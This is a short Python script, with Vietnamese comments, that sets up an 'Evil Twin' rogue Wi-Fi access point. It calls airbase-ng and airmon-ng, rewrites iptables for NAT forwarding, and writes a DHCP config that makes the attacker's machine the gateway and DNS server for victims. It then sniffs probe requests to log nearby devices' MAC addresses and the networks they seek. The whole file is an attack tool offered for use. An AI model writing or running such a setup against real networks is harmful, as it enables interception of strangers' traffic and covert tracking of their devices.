import os
import time
import threading
from scapy.all import *

# Cấu hình điểm truy cập giả mạo
SSID = 'hacker vietnam'  # SSID của điểm truy cập giả mạo
INTERFACE = 'wlan0mon'  # Giao diện mạng
CHANNEL = 6  # Kênh phát sóng

# Cấu hình IP và DHCP
GATEWAY_IP = '192.168.1.1'
DHCP_RANGE_START = '192.168.1.10'
DHCP_RANGE_END = '192.168.1.50'

# Khởi tạo điểm truy cập giả mạo
def start_fake_ap():
    os.system(f'airmon-ng start {INTERFACE}')
    os.system(f'airbase-ng -e "{SSID}" -c {CHANNEL} {INTERFACE} &')
    os.system(f'ifconfig at0 up')
    os.system(f'ifconfig at0 {GATEWAY_IP} netmask 255.255.255.0')
    os.system(f'iptables --flush')
    os.system(f'iptables --table nat --flush')
    os.system(f'iptables --delete-chain')
    os.system(f'iptables --table nat --delete-chain')
    os.system(f'iptables --table nat --append POSTROUTING --out-interface {INTERFACE} -j MASQUERADE')
    os.system(f'iptables --append FORWARD --in-interface at0 -j ACCEPT')
    os.system(f'echo 1 > /proc/sys/net/ipv4/ip_forward')

    # Cấu hình DHCP
    with open('/etc/dhcp/dhcpd.conf', 'w') as dhcp_conf:
        dhcp_conf.write(f"""
default-lease-time 600;
max-lease-time 7200;
authoritative;
subnet 192.168.1.0 netmask 255.255.255.0 {{
    range {DHCP_RANGE_START} {DHCP_RANGE_END};
    option routers {GATEWAY_IP};
    option domain-name-servers {GATEWAY_IP};
}}
""")
    os.system('service isc-dhcp-server restart')

# Bắt gói tin để thu thập thông tin
def packet_sniffer():
    def packet_handler(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            mac_address = pkt.addr2
            ssid = pkt.info.decode()
            print(f'Probe request from {mac_address} for SSID {ssid}')
    
    sniff(iface='at0', prn=packet_handler, store=0)

if __name__ == '__main__':
    try:
        # Khởi động điểm truy cập giả mạo trong một luồng riêng
        ap_thread = threading.Thread(target=start_fake_ap)
        ap_thread.start()

        # Đợi điểm truy cập khởi động
        time.sleep(5)

        # Bắt đầu bắt gói tin
        packet_sniffer()
    except KeyboardInterrupt:
        os.system('airmon-ng stop wlan0mon')
        os.system('iptables --flush')
        print('Stopped the Evil Twin attack')
